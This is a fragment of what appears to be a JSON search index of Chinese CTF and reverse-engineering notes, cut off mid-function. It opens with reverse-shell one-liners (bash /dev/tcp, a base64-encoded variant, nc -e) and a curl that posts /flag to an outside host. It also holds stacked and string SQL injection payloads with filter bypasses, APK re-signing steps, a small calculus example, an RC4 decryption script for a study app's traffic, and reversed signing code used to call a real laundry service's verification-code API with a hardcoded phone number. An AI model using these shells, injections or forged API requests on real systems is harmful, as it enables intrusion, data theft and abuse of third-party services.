\u0026gt;\u0026amp; /dev/tcp/111.111.111.111/7015 0\u0026gt;\u0026amp;1 #对上面进行base64编码=\u0026gt;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i} 解释\n命令 详解 bash -i 产生一个bash交互环境 \u0026gt;\u0026amp; 将联合符号前面的内容与后面相结合，然后一起重定向给后者。这样在被攻击机上就不会显示执行的命令 /dev/tcp/47.xxx.xxx.72/2333 Linux环境中所有的内容都是以文件的形式存在的，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。 0\u0026gt;\u0026amp;1 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容 curl http://vps:7015 -d @/flag -d参数时post\n@后面时这个文件\n本地监听就能看到请求的flag\nnc -e /bin/sh 192.168.146.129 2333 主要就是上面这些\nnetcat 47.xxx.xxx.72 2333 -e /bin/bash "},{"id":53,"href":"/docs/re/%E5%8F%8D%E7%BC%96%E8%AF%91/","title":"反编译","section":"re","content":"\r签名\r#\r生成jks文件\nkeytool -genkeypair -alias ljyhljyh -keypass ljyhljyh -keyalg RSA -keysize 1024 -validity 365 -keystore filename.jks -storepass ljyhljyh 重新签名\njarsigner -verbose -keystore filename.jks -storepass 501937 -signedjar ai3.apk -digestalg SHA1 -sigalg MD5withRSA ai2.apk filename apktool\r#\r反编译\napktool d apk_name 重新打包\napktool b 文件 -o apk_name "},{"id":54,"href":"/docs/learm/math/%E5%9F%BA%E6%9C%AC%E7%A7%AF%E5%88%86/","title":"基本积分","section":"math","content":"![[Pasted image 20240121093020.png]] ![[Pasted image 20240121093034.png]]\n"},{"id":55,"href":"/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","title":"堆叠注入","section":"php","content":"堆叠注入\n用分号可以 执行多条语句\n查看所有数据库\n-1\u0026#39;;show databases 查看当前数据库下所有表名\n-1\u0026#39;;use 数据库名;show tables 查看表名下所有字段\n-1\u0026#39;;use 数据库名;show columns from 表名 flag，用预编译的方法\n-1\u0026#39;;use 数据库名;set @sql=concat(\u0026#39;select `fl\u0026#39;,\u0026#39;ag` fr/**/om Fl\u0026#39;,\u0026#39;ag\u0026#39;);PRE/**/PARE st/**/mt1 FR/**/OM @sql;EX/**/ECUTE stmt1;# select被过滤，用HANDLER语句，语法\nHANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name { = | \u0026lt;= | \u0026gt;= | \u0026lt; | \u0026gt; } (value1,value2,…) [ WHERE where_condition ] [LIMIT … ] HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT … ] HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT … ] HANDLER tbl_name CLOSE 1\u0026#39;;HANDLER FlagHere open;HANDLER FlagHere read first;HANDLER FlagHere close;# \u0026lsquo;select ``fl\u0026rsquo;,\u0026lsquo;ag , from Fl\u0026rsquo;,\u0026lsquo;ag\u0026rsquo;\n"},{"id":56,"href":"/docs/re/new/%E5%A4%A7%E5%AD%A6%E6%90%9C%E9%A2%98%E9%85%B1/","title":"大学搜题","section":"demo","content":"一个搜书的软件，图片还挺高清的，有多个版本。其中包含flutter 开发的版本，且只有32为so文件，但是也有早期的flutter 包含arm-v8a，但是flutter 版本是2.14，用blutter 解析不了这么早的版本，但是转机又来了，拿一台root的机子抓包，我们其实只要图片下载链接，抓到的数据有加密，没想到的是，所有的逻辑都在java中，但是又有so，用frida hook，RC4解密。写个脚本。易得\nimport json import base64 key=\u0026#39;963ac4d1931cbd65a058145ede2e443c6a59ac4591ec29c27a41545f602da5f93e61372b6840e4120825cb5e786f37ef31cd22941af1d9898bc5ba70303e71f8\u0026#39; from Crypto.Cipher import ARC4 as rc4cipher def rc4_algorithm(encrypt_or_decrypt, data, key1): if encrypt_or_decrypt == \u0026#34;encrypt\u0026#34;: key = bytes(key1, encoding=\u0026#39;utf-8\u0026#39;) enc = rc4cipher.new(key) res = enc.encrypt(data.encode(\u0026#39;utf-8\u0026#39;)) res=base64.b64encode(res) res = str(res,\u0026#39;utf8\u0026#39;) return res elif encrypt_or_decrypt == \u0026#34;decrypt\u0026#34;: data = base64.b64decode(data) key = bytes(key1, encoding=\u0026#39;utf-8\u0026#39;) enc = rc4cipher.new(key) res = enc.decrypt(data) res = str(res,\u0026#39;utf8\u0026#39;) return res # rc4_algorithm(\u0026#39;decrypt\u0026#39;, \u0026#39;VDyAGqfU78Qa6tb5z5A1zsaWRwpmSSXjSMh4y0EA5dx1gT7QxBpQzTWoE3Co3WCpWta517pIF48jkloERSwwBRTYDFt4fataFjKQyBYgsgizTIRbgCC/\u0026#39;, key) with open(\u0026#34;token.txt\u0026#34;,\u0026#39;r\u0026#39;,encoding=\u0026#39;utf-8\u0026#39;) as f: jscode=json.load(f) # print(jscode) for i in jscode[\u0026#39;chapterList\u0026#39;]: title=rc4_algorithm(\u0026#39;decrypt\u0026#39;,i[\u0026#39;chapterTitle\u0026#39;],key) print(\u0026#34;### \u0026#34;+title) for _ in i[\u0026#39;answers\u0026#39;]: url=rc4_algorithm(\u0026#39;decrypt\u0026#39;,_[\u0026#39;origin\u0026#39;],key) print(url) "},{"id":57,"href":"/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/","title":"字符型注入","section":"php","content":"字符型注入\n单引号测试，闭合语句\nid=1\u0026#39; id=\u0026#39;\u0026#34;) 报错，查询字段\nid=1\u0026#39; and 1=2 union select 1,2,3%23 其他和整型注入一样，不多做解释\n$rows[0]==$password 1\u0026#39;/**/union/**/select/**/replace(replace(\u0026#39;1\u0026#34;/**/union/**/select/**/replace(replace(\u0026#34;.\u0026#34;,chr(34),chr(39)),chr(46),\u0026#34;.\u0026#34;)#\u0026#39;,chr(34),chr(39)),chr(46),\u0026#39;1\u0026#34;/**/union/**/select/**/replace(replace(\u0026#34;.\u0026#34;,chr(34),chr(39)),chr(46),\u0026#34;.\u0026#34;)#\u0026#39;)# 0x char chr等价 "},{"id":58,"href":"/docs/learm/math/%E5%AF%BC%E6%95%B0/","title":"导数","section":"math","content":"\r导数真的帅\r#\r测试题，求导\n$$ \\ln(e^x+\\sqrt{1+e^{2x}})' \\\\= \\frac{1}{e^x+\\sqrt{1+e^{2x}}} \\cdot (e^x+\\sqrt{1+e^{2x}})' $$\n先求\n$$ (e^x+\\sqrt{1+e^{2x}})' \\= e^x+\\frac{1}{2} \\cdot \\frac{1}{\\sqrt{1+e^{2x}} } \\cdot e^{2x} \\cdot 2 \\qquad //链式法则 \\= e^x+\\frac{e^{2x}}{\\sqrt{1+e^{2x}}} $$\n化简\n$$ \\frac{e^x+\\frac{e^{2x}}{\\sqrt{1+e^{2x}}}}{e^x+\\sqrt{1+e^{2x}}} \\\\ 分子：e^x+\\frac{e^{2x}}{\\sqrt{1+e^{2x}}}=\\frac{e^{2x} \\cdot \\sqrt{1+e^{2x}}+e^{2x}}{\\sqrt{1+e^{2x}}} \\\\ 原式：=\\frac{\\frac{e^x \\cdot \\sqrt{1+e^{2x}}+e^{2x}}{\\sqrt{1+e^{2x}}}}{e^x+\\sqrt{1+e^{2x}}} \\\\= \\frac{e^x \\cdot \\sqrt{1+e^{2x}}+e^{2x}}{(e^x+\\sqrt{1+e^{2x}}) \\cdot \\sqrt{1+e^{2x}}} \\\\分子提取e^x： \\frac{e^x( \\sqrt{1+e^{2x}}+e^x)}{(e^x+\\sqrt{1+e^{2x}}) \\cdot \\sqrt{1+e^{2x}}} \\\\上下约分： \\frac{e^x}{\\sqrt{1+e^{2x}}} $$\n结果\n$$ \\frac{e^x}{\\sqrt{1+e^{2x}}} $$\n$$ \\ln(e^x+\\sqrt{1+e^{2x}})' $$\n"},{"id":59,"href":"/docs/re/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91/","title":"小程序 逆向","section":"re","content":"\r小程序逆向\r#\r抓包\n电脑版微信最新版抓不了包，用3.7.6一下的\n微信在登陆时，右上角把代理填上\n把AppData\\Roaming\\Tencent\\WeChat\\XPlugin\\Plugins里面的东西删了，不影响使用\n解密\n下载aen516954023/wxappUnpacker: 微信小程序本地应用包逆向工具 (github.com)\n解密wxapkg文件，在C:\\Users\\xxx\\Documents\\WeChat Files\\Applet\n在解密的时候出现各种几把问题，均可参考百度，google等\n可能因为解密不出来wml和wss不能动态调试很难受\nwxapkg文件解包\n其他的单独解\n逆向\n因为没有拿到wml和wss，所以只能静态分析\n还好比较简单\n​\t因为不能调试，不知道最后一个sign传的什么参数，是做的md5\nimport requests import execjs phone=\u0026#39;17628818007\u0026#39; url=\u0026#39;https://www.sharewash.cn/saywash/WashCallApi/common/user/requestVerifyCode.api\u0026#39; data={\u0026#39;phoneNumber\u0026#39;:phone,\u0026#39;ssid\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;tokenId\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;sign\u0026#39;:\u0026#39;\u0026#39;} with open(\u0026#39;../js/2.js\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;utf-8\u0026#39;) as fp: js1=fp.read() ssid=execjs.compile(js1).call(\u0026#39;getTime\u0026#39;) data[\u0026#39;ssid\u0026#39;]=ssid data[\u0026#39;sign\u0026#39;]=execjs.compile(js1).call(\u0026#39;getsign\u0026#39;,ssid,phone) print(data) function getsign() { var i, g = arguments; i = { \u0026#39;phoneNumber\u0026#39;: \u0026#39;17628818007\u0026#39;, \u0026#39;ssid\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;tokenId\u0026#39;: \u0026#39;\u0026#39; } return i.ssid = getTime(), i.tokenId = false || \u0026#34;\u0026#34;, i.sign = sign(i) } function r(r) { var a = new Array(), n = r.length, s = parseInt(n / 4), f = n % 4, o = 0; for (o = 0; o \u0026lt; s; o++) a[o] = e(r.substring(4 * o + 0, 4 * o + 4)); return f \u0026gt; 0 \u0026amp;\u0026amp; (a[o] = e(r.substring(4 * o + 0, n))), a; } function e(r) { var e = r.length, a = new Array(64), n = 0, s = 0, f = 0, o = 0; if (e \u0026lt; 4) { for (n = 0; n \u0026lt; e; n++) { var c = r.charCodeAt(n); for (s = 0; s \u0026lt; 16; s++) { var t = 1, l = 0; for (l = 15; l \u0026gt; s; l--) t *= 2; a[16 * n + s] = parseInt(c / t) % 2; } } for (f = e; f \u0026lt; 4; f++) { c = 0; for (o = 0; o \u0026lt; 16; o++) { t = 1, l = 0; for (l = 15; l \u0026gt; o; l--) t *= 2; a[16 * f + o] = parseInt(c / t) % 2; } } } else for (n = 0; n \u0026lt; 4; n++) { c = r.charCodeAt(n); for (s = 0; s \u0026lt; 16; s++) { t = 1; for (l = 15; l \u0026gt; s; l--) t *= 2; a[16 * n + s] = parseInt(c / t) % 2; } } return a; } function a(r) { var e; switch (r) { case \u0026#34;0000\u0026#34;: e = \u0026#34;0\u0026#34;; break; case \u0026#34;0001\u0026#34;: e = \u0026#34;1\u0026#34;; break; case \u0026#34;0010\u0026#34;: e = \u0026#34;2\u0026#34;; break; case \u0026#34;0011\u0026#34;: e = \u0026#34;3\u0026#34;; break; case \u0026#34;0100\u0026#34;: e = \u0026#34;4\u0026#34;; break; case \u0026#34;0101\u0026#34;: e = \u0026#34;5\u0026#34;; break; case \u0026#34;0110\u0026#34;: e = \u0026#34;6\u0026#34;; break; case \u0026#34;0111\u0026#34;: e = \u0026#34;7\u0026#34;; break; case \u0026#34;1000\u0026#34;: e = \u0026#34;8\u0026#34;; break; case \u0026#34;1001\u0026#34;: e = \u0026#34;9\u0026#34;; break; case \u0026#34;1010\u0026#34;: e = \u0026#34;A\u0026#34;; break; case \u0026#34;1011\u0026#34;: e = \u0026#34;B\u0026#34;; break; case \u0026#34;1100\u0026#34;: e = \u0026#34;C\u0026#34;; break; case \u0026#34;1101\u0026#34;: e = \u0026#34;D\u0026#34;; break; case \u0026#34;1110\u0026#34;: e = \u0026#34;E\u0026#34;; break; case \u0026#34;1111\u0026#34;: e = \u0026#34;F\u0026#34;; } return e; } function n(r) { for (var e = \u0026#34;\u0026#34;, n = 0; n \u0026lt; 16; n++) { for (var s = \u0026#34;\u0026#34;, f = 0; f \u0026lt; 4; f++) s += r[4 * n + f]; e += a(s); } return e; } function s(r, e) { var a = k(e), n = f(r), s = new Array(32), b = new Array(32), i = new Array(32), w = 0, v = 0, A = 0, y = 0, h = 0; for (A = 0; A \u0026lt; 32; A++) s[A] = n[A], b[A] = n[32 + A]; for (w = 0; w \u0026lt; 16; w++) { for (v = 0; v \u0026lt; 32; v++) i[v] = s[v], s[v] = b[v]; var g = new Array(48); for (y = 0; y \u0026lt; 48; y++) g[y] = a[w][y]; var p = c(l(t(c(o(b), g))), i); for (h = 0; h \u0026lt; 32; h++) b[h] = p[h]; } var I = new Array(64); for (w = 0; w \u0026lt; 32; w++) I[w] = b[w], I[32 + w] = s[w]; return u(I); } function f(r) { for (var e = new Array(64), a = 0, n = 1, s = 0; a \u0026lt; 4; a++, n += 2, s += 2) for (var f = 7, o = 0; f \u0026gt;= 0; f--, o++) e[8 * a + o] = r[8 * f + n], e[8 * a + o + 32] = r[8 * f + s]; return e; } function o(r) { for (var e = new Array(48), a = 0; a \u0026lt; 8; a++) e[6 * a + 0] = 0 == a ? r[31] : r[4 * a - 1], e[6 * a + 1] = r[4 * a + 0], e[6 * a + 2] = r[4 * a + 1], e[6 * a + 3] = r[4 * a + 2], e[6 * a + 4] = r[4 * a + 3], e[6 * a + 5] = 7 == a ? r[0] : r[4 * a + 4]; return e; } function c(r, e) { for (var a = new Array(r.length), n = 0; n \u0026lt; r.length; n++) a[n] = r[n] ^ e[n]; return a; } function t(r) { for (var e = new Array(32), a = \u0026#34;\u0026#34;, n = [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]], s = [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]], f = [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]], o = [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]], c = [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]], t = [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]], l = [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]], u = [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]], k = 0; k \u0026lt; 8; k++) { var i, w; switch (i = 2 * r[6 * k + 0] + r[6 * k + 5], w = 2 * r[6 * k + 1] * 2 * 2 + 2 * r[6 * k + 2] * 2 + 2 * r[6 * k + 3] + r[6 * k + 4], k) { case 0: a = b(n[i][w]); break; case 1: a = b(s[i][w]); break; case 2: a = b(f[i][w]); break; case 3: a = b(o[i][w]); break; case 4: a = b(c[i][w]); break; case 5: a = b(t[i][w]); break; case 6: a = b(l[i][w]); break; case 7: a = b(u[i][w]); } e[4 * k + 0] = parseInt(a.substring(0, 1)), e[4 * k + 1] = parseInt(a.substring(1, 2)), e[4 * k + 2] = parseInt(a.substring(2, 3)), e[4 * k + 3] = parseInt(a.substring(3, 4)); } return e; } function l(r) { var e = new Array(32); return e[0] = r[15], e[1] = r[6], e[2] = r[19], e[3] = r[20], e[4] = r[28], e[5] = r[11], e[6] = r[27], e[7] = r[16], e[8] = r[0], e[9] = r[14], e[10] = r[22], e[11] = r[25], e[12] = r[4], e[13] = r[17], e[14] = r[30], e[15] = r[9], e[16] = r[1], e[17] = r[7], e[18] = r[23], e[19] = r[13], e[20] = r[31], e[21] = r[26], e[22] = r[2], e[23] = r[8], e[24] = r[18], e[25] = r[12], e[26] = r[29], e[27] = r[5], e[28] = r[21], e[29] = r[10], e[30] = r[3], e[31] = r[24], e; } function u(r) { var e = new Array(64); return e[0] = r[39], e[1] = r[7], e[2] = r[47], e[3] = r[15], e[4] = r[55], e[5] = r[23], e[6] = r[63], e[7] = r[31], e[8] = r[38], e[9] = r[6], e[10] = r[46], e[11] = r[14], e[12] = r[54], e[13] = r[22], e[14] = r[62], e[15] = r[30], e[16] = r[37], e[17] = r[5], e[18] = r[45], e[19] = r[13], e[20] = r[53], e[21] = r[21], e[22] = r[61], e[23] = r[29], e[24] = r[36], e[25] = r[4], e[26] = r[44], e[27] = r[12], e[28] = r[52], e[29] = r[20], e[30] = r[60], e[31] = r[28], e[32] = r[35], e[33] = r[3], e[34] = r[43], e[35] = r[11], e[36] = r[51], e[37] = r[19], e[38] = r[59], e[39] = r[27], e[40] = r[34], e[41] = r[2], e[42] = r[42], e[43] = r[10], e[44] = r[50], e[45] = r[18], e[46] = r[58], e[47] = r[26], e[48] = r[33], e[49] = r[1], e[50] = r[41], e[51] = r[9], e[52] = r[49], e[53] = r[17], e[54] = r[57], e[55] = r[25], e[56] = r[32], e[57] = r[0], e[58] = r[40], e[59] = r[8], e[60] = r[48], e[61] = r[16], e[62] = r[56], e[63] = r[24], e; } function b(r) { var e = \u0026#34;\u0026#34;; switch (r) { case 0: e = \u0026#34;0000\u0026#34;; break; case 1: e = \u0026#34;0001\u0026#34;; break; case 2: e = \u0026#34;0010\u0026#34;; break; case 3: e = \u0026#34;0011\u0026#34;; break; case 4: e = \u0026#34;0100\u0026#34;; break; case 5: e = \u0026#34;0101\u0026#34;; break; case 6: e = \u0026#34;0110\u0026#34;; break; case 7: e = \u0026#34;0111\u0026#34;; break; case 8: e = \u0026#34;1000\u0026#34;; break; case 9: e = \u0026#34;1001\u0026#34;; break; case 10: e = \u0026#34;1010\u0026#34;; break; case 11: e = \u0026#34;1011\u0026#34;; break; case 12: e = \u0026#34;1100\u0026#34;; break; case 13: e = \u0026#34;1101\u0026#34;; break; case 14: e = \u0026#34;1110\u0026#34;; break; case 15: e = \u0026#34;1111\u0026#34;; } return e; } function k(r) { var e = new Array(56), a = new Array(); a[0] = new Array(), a[1] = new Array(), a[2] = new Array(), a[3] = new Array(), a[4] = new Array(), a[5] = new Array(), a[6] = new Array(), a[7] = new Array(), a[8] = new Array(), a[9] = new Array(), a[10] = new Array(), a[11] = new Array(), a[12] = new Array(), a[13] = new Array(), a[14] = new Array(), a[15] = new Array(); for (var n = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1], s = 0; s \u0026lt; 7; s++) for (var f = 0, o = 7; f \u0026lt; 8; f++, o--) e[8 * s + f] = r[8 * o + s]; s = 0; for (s = 0; s \u0026lt; 16; s++) { var c = 0, t = 0; for (f = 0; f \u0026lt; n[s]; f++) { for (c = e[0], t = e[28], o = 0; o \u0026lt; 27; o++) e[o] = e[o + 1], e[28 + o] = e[29 + o]; e[27] = c, e[55] = t; } var l = new Array(48); switch (l[0] = e[13], l[1] = e[16], l[2] = e[10], l[3] = e[23], l[4] = e[0], l[5] = e[4], l[6] = e[2], l[7] = e[27], l[8] = e[14], l[9] = e[5], l[10] = e[20], l[11] = e[9], l[12] = e[22], l[13] = e[18], l[14] = e[11], l[15] = e[3], l[16] = e[25], l[17] = e[7], l[18] = e[15], l[19] = e[6], l[20] = e[26], l[21] = e[19], l[22] = e[12], l[23] = e[1], l[24] = e[40], l[25] = e[51], l[26] = e[30], l[27] = e[36], l[28] = e[46], l[29] = e[54], l[30] = e[29], l[31] = e[39], l[32] = e[50], l[33] = e[44], l[34] = e[32], l[35] = e[47], l[36] = e[43], l[37] = e[48], l[38] = e[38], l[39] = e[55], l[40] = e[33], l[41] = e[52], l[42] = e[45], l[43] = e[41], l[44] = e[49], l[45] = e[35], l[46] = e[28], l[47] = e[31], s) { case 0: for (var u = 0; u \u0026lt; 48; u++) a[0][u] = l[u]; break; case 1: for (u = 0; u \u0026lt; 48; u++) a[1][u] = l[u]; break; case 2: for (u = 0; u \u0026lt; 48; u++) a[2][u] = l[u]; break; case 3: for (u = 0; u \u0026lt; 48; u++) a[3][u] = l[u]; break; case 4: for (u = 0; u \u0026lt; 48; u++) a[4][u] = l[u]; break; case 5: for (u = 0; u \u0026lt; 48; u++) a[5][u] = l[u]; break; case 6: for (u = 0; u \u0026lt; 48; u++) a[6][u] = l[u]; break; case 7: for (u = 0; u \u0026lt; 48; u++) a[7][u] = l[u]; break; case 8: for (u = 0; u \u0026lt; 48; u++) a[8][u] = l[u]; break; case 9: for (u = 0; u \u0026lt; 48; u++) a[9][u] = l[u]; break; case 10: for (u = 0; u \u0026lt; 48; u++) a[10][u] = l[u]; break; case 11: for (u = 0; u \u0026lt; 48; u++) a[11][u] = l[u]; break; case 12: for (u = 0; u \u0026lt; 48; u++) a[12][u] = l[u]; break; case 13: for (u = 0; u \u0026lt; 48; u++) a[13][u] = l[u]; break; case 14: for (u = 0; u \u0026lt; 48; u++) a[14][u] = l[u]; break; case 15: for (u = 0; u \u0026lt; 48; u++) a[15][u] = l[u]; } } return a; } // module.exports = { function getTime() { return function (a, f, o, c) { var t, l, u, b, k, i, w = a.length, v = \u0026#34;\u0026#34;; null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; (t = r(f), b = t.length); null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o \u0026amp;\u0026amp; (l = r(o), k = l.length); null != c \u0026amp;\u0026amp; \u0026#34;\u0026#34; != c \u0026amp;\u0026amp; (u = r(c), i = u.length); if (w \u0026gt; 0) if (w \u0026lt; 4) { var A = e(a); if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o \u0026amp;\u0026amp; null != c \u0026amp;\u0026amp; \u0026#34;\u0026#34; != c) { for ($ = A, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); for (d = 0; d \u0026lt; i; d++) $ = s($, u[d]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o) { for ($ = A, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f) { var y = 0; for ($ = A, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); x = $; } v = n(x); } else { var h = parseInt(w / 4), g = w % 4, p = 0; for (p = 0; p \u0026lt; h; p++) { var I = e(a.substring(4 * p + 0, 4 * p + 4)); if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o \u0026amp;\u0026amp; null != c \u0026amp;\u0026amp; \u0026#34;\u0026#34; != c) { for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); for (d = 0; d \u0026lt; i; d++) $ = s($, u[d]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o) { for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f) { for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); x = $; } v += n(x); } if (g \u0026gt; 0) { var x; I = e(a.substring(4 * h + 0, w)); if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o \u0026amp;\u0026amp; null != c \u0026amp;\u0026amp; \u0026#34;\u0026#34; != c) { var d; for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); for (d = 0; d \u0026lt; i; d++) $ = s($, u[d]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o) { var C; for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f) { var $; for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); x = $; } v += n(x); } } return v; }(\u0026#34;saywash#\u0026#34; + new Date().valueOf(), \u0026#34;hlF#$1x)\u0026#34;, \u0026#34;hlG#$2x)\u0026#34;, \u0026#34;hlH#$3x)\u0026#34;); } function sign(e) { Array.prototype.indexVf = function (r) { for (var e = 0; e \u0026lt; this.length; e++) if (this[e] == r) return e; } var t = [], n = [], i = []; for (var s in e) t.push(s), i.push(s), n.push(e[s]); for (var o = i.sort(), u = \u0026#34;SING=HLYF\u0026#34;, f = 0; f \u0026lt; o.length; f++) if (\u0026#34;tokenId\u0026#34; != o[f] \u0026amp;\u0026amp; \u0026#34;ssid\u0026#34; != o[f] \u0026amp;\u0026amp; \u0026#34;sign\u0026#34; != o[f]) { var a = t.indexVf(o[f]); \u0026#34;\u0026#34; != n[a] \u0026amp;\u0026amp; null != n[a] \u0026amp;\u0026amp; (u = u + \u0026#34;\u0026amp;\u0026#34; + o[f] + \u0026#34;=\u0026#34; + n[a]); } return \u0026#34;SING=HLYF\u0026#34; == (u = u.toUpperCase()) \u0026amp;\u0026amp; (u = \u0026#34;SING=HLYF\u0026amp;\u0026#34;), u = md5(u); } function md5(string) { function md5_RotateLeft(lValue, iShiftBits) { return (lValue \u0026lt;\u0026lt; iShiftBits) | (lValue \u0026gt;\u0026gt;\u0026gt; (32 - iShiftBits)); } function md5_AddUnsigned(lX, lY) { var lX4, lY4, lX8, lY8, lResult; lX8 = (lX \u0026amp; 0x80000000); lY8 = (lY \u0026amp; 0x80000000); lX4 = (lX \u0026amp; 0x40000000); lY4 = (lY \u0026amp; 0x40000000); lResult = (lX \u0026amp; 0x3FFFFFFF) + (lY \u0026amp; 0x3FFFFFFF); if (lX4 \u0026amp; lY4) { return (lResult ^ 0x80000000 ^ lX8 ^ lY8); } if (lX4 | lY4) { if (lResult \u0026amp; 0x40000000) { return (lResult ^ 0xC0000000 ^ lX8 ^ lY8); } else { return (lResult ^ 0x40000000 ^ lX8 ^ lY8); } } else { return (lResult ^ lX8 ^ lY8); } } function md5_F(x, y, z) { return (x \u0026amp; y) | ((~x) \u0026amp; z); } function md5_G(x, y, z) { return (x \u0026amp; z) | (y \u0026amp; (~z)); } function md5_H(x, y, z) { return (x ^ y ^ z); } function md5_I(x, y, z) { return (y ^ (x | (~z))); } function md5_FF(a, b, c, d, x, s, ac) { a = md5_AddUnsigned(a, md5_AddUnsigned(md5_AddUnsigned(md5_F(b, c, d), x), ac)); return md5_AddUnsigned(md5_RotateLeft(a, s), b); }; function md5_GG(a, b, c, d, x, s, ac) { a = md5_AddUnsigned(a, 